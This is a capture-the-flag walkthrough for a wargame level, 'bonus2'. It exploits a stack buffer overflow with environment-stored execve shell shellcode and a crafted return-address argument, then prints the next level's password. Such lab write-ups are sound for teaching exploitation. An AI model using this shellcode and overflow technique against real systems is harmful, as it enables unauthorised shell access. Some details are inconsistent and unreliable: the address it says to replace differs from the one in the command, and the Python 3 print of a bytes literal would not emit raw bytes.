# Bonus 02 Walkthrough

## Binary analysis

The binary is vulnerable to a buffer overflow. By overflowing the buffer, we can overwrite the return address and redirect execution to shellcode placed in an environment variable, similar to previous levels. The offset to the return address is 23 bytes into the second argument.

## Exploitation

1. Export the shellcode in an environment variable (as in previous levels):
   ```bash
   export SC=$(python -c 'print(b"\x90"*5000 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
   ```
2. Find the address of the shellcode in the environment (using gdb and `x/2000s (char **)environ`).
3. Overflow the buffer and overwrite the return address with the address of the shellcode:
   ```bash
   ./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 23 + "\xe6\xfe\xff\xbf"[::-1])')
   ```
   (Replace `\xbf\xff\xeb\xff` with the correct address for your environment)

## Commands used

```
export SC=$(python -c 'print(b"\x90"*5000 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 23 + "\xe6\xfe\xff\xbf"[::-1])')
cat /home/user/bonus3/.pass
```

## Result

After running the exploit, we get a shell as bonus3 and can read the password:

```
cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

Copy the password for the next level. 